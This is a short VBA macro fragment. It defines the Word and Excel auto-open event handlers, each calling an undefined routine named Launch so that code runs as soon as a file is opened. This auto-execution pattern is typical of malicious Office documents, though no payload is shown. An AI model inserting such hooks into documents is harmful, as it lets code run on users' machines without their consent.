Sub AutoOpen()
    ' Becomes launched as first on MS Word
    Launch
End Sub

Sub Document_Open()
    ' Becomes launched as second, another try, on MS Word
    Launch
End Sub

Sub Auto_Open()
    ' Becomes launched as first on MS Excel
    Launch
End Sub

Sub Workbook_Open()
    ' Becomes launched as second, another try, on MS Excel
    Launch
End Sub
